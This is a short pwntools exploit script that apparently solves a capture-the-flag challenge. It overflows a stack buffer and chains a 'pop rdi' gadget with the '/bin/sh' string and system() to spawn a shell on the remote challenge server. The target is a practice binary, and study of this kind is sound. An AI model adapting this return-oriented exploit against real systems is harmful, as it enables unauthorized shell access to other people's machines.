#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'

context(arch='amd64', os='linux')

ELF_IMG = './level2_x64'

binsh = 0x600A90

pop_rdi_ret = 0x4006b3

# io = process(ELF_IMG)
io = remote('pwn2.jarvisoj.com', 9882)

elf = ELF(ELF_IMG)

offset = 0x80

payload = 'a' * (offset + 8) + p64(pop_rdi_ret) + p64(binsh) + p64(elf.symbols['system'])

print repr(payload)

io.sendlineafter(':\n', payload)

io.interactive()
